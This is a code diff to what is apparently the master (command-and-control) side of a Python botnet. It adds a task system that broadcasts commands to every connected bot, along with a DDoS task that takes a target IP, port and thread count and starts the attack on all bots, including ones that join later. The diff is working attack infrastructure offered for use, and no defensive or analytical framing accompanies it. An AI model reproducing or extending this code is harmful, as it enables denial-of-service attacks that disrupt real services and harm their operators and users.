@@ -3,12 +3,14 @@
 # Description: Interface for the master 
 
 from os import path
+from re import match
 from lib import const
-from time import sleep
 from . import ssh, sftp
 from hashlib import sha256
+from time import time, sleep
 from os import urandom, path 
 from threading import Thread 
+from datetime import datetime
 
 class FTP(object):
 
@@ -42,12 +44,45 @@ class FTP(object):
  def close(self):
   self.sftp.close()
 
+######## Tasks #########
+
+class Task(object):
+
+ def __init__(self, task_id, task_args, task_info_obj):
+  self.id = task_id 
+  self.args = task_args
+  self.task_info_obj = task_info_obj
+
+ def start(self, bots):
+  for bot in [bots[bot] for bot in bots]:
+   bot['shell'].send(10, (self.id, self.args))
+
+ def stop(self, bots):
+  for bot in [bots[bot] for bot in bots]:
+   bot['shell'].send(11)
+
+class TaskDdos(object):
+
+ def __init__(self, target, threads):
+  self.target = target
+  self.threads = threads
+  self.time_assigned = time()
+
+ def info(self):
+  time_assigned = datetime.fromtimestamp(self.time_assigned).strftime('%b %d, %Y at %I:%M %p')
+  a = 'Task name: Ddos Attack\nTime assigned: {}\n\n'.format(time_assigned)
+  b = 'Target: {}\nThreads: {}'.format(self.target, self.threads)
+  return a + b
+
+######## Interface ########
+
 class Interface(object):
 
  def __init__(self): 
   self.bots = {}
   self.ssh = None
   self.ftp = None 
+  self.task = None
   self.sig = self.signature
 
  def close(self):
@@ -91,6 +126,8 @@ class Interface(object):
    self.bots[sess_obj] = { 'bot_id': bot_id, 'uuid': uuid, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
    self.sig = self.signature  
    print(self.bots)
+   if self.task:
+    shell.send(10, (self.task.id, self.task.args))
 
  def close_sess(self, sess_obj, shell_obj):
   print('Closing session ...')
@@ -117,8 +154,8 @@ class Interface(object):
    self.sig = self.signature
 
  def disconnect_all(self):
-  for bot in self.bots:
-   self.bots[bot]['session'].close()
+  for bot in [self.bots[bot] for bot in self.bots]:
+   bot['session'].close()
   self.sig = self.signature
      
  def get_bot(self, bot_id):
@@ -187,6 +224,9 @@ class Interface(object):
 
  def execute_cmd_by_id(self, bot_id, cmd_id, args):
   override = True if '--override' in args else False
+  if not cmd_id.isdigit():
+   return 'Failed to send command'
+
   cmd_id = int(cmd_id)
 
   if override:
@@ -202,3 +242,86 @@ class Interface(object):
     bot['shell'].send(code=cmd_id, args=args)
     return 'Command sent successfully'
   return 'Failed to send command'
+
+ def start_task(self):
+  Thread(target=self.task.start, args=[self.bots], daemon=True).start()
+
+ def stop_task(self):
+  if self.task:
+   t = Thread(target=self.task.stop, args=[self.bots], daemon=True)
+   t.start()
+   t.join()
+   self.task = None
+
+ def execute_cmd_by_task_id(self, cmd_id, args):
+  if not cmd_id.isdigit():
+   return 'Failed to send command'   
+  cmd_id = int(cmd_id)
+
+  if cmd_id == 0: # stop task
+   Thread(target=self.stop_task, daemon=True).start()
+   return 'Task terminated' if self.task else 'No task is set'
+  elif cmd_id == 1: # status
+   return self.get_task()
+  else:
+   resp = self.set_task(cmd_id, args)
+   if resp == True:
+    self.start_task()
+    return 'Task set successfully'
+   else:
+    return resp
+
+ def get_task(self):
+  return 'No task is set' if not self.task else self.task.task_info_obj.info()
+
+ def set_task(self, task_id, args):
+  if task_id == 2: # ddos 
+   return self.set_ddos_task(args)
+  else:
+   return 'Failed to set task' 
+
+ def set_ddos_task(self, args):
+  task_id = 1 # the the bot side 
+  if not len(args) == 3:
+   return 'Invalid amount of arguments'
+
+  ip, port, threads = args
+
+  if not self.valid_ip(ip):
+   return 'Invalid IP address'
+
+  if not self.valid_port(port):
+   return 'Invalid port'
+
+  if not self.valid_thread(threads):
+   return 'Invalid thread'
+
+  task_info_obj = TaskDdos('{}:{}'.format(ip, port), threads)
+  self.task = Task(task_id, (ip, int(port), int(threads)), task_info_obj)
+  return True
+
+ def valid_thread(self, thread):
+  return True if thread.isdigit() else False
+
+ def valid_ip(self, ip):
+  return False if not match(r'^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$', ip) else True
+ 
+ def valid_port(self, port):
+  _port = str(port).strip()
+  
+  if not len(_port): 
+   return False
+  else:
+   #  check if number
+   for item in _port:
+    if not item.isdigit():
+     return False    
+
+   # check if number starts with a zero
+   if int(_port[0]) == 0:
+    return False 
+
+   # check if number is larger than 65535
+   if int(_port) > 65535:
+    return False 
+   return True
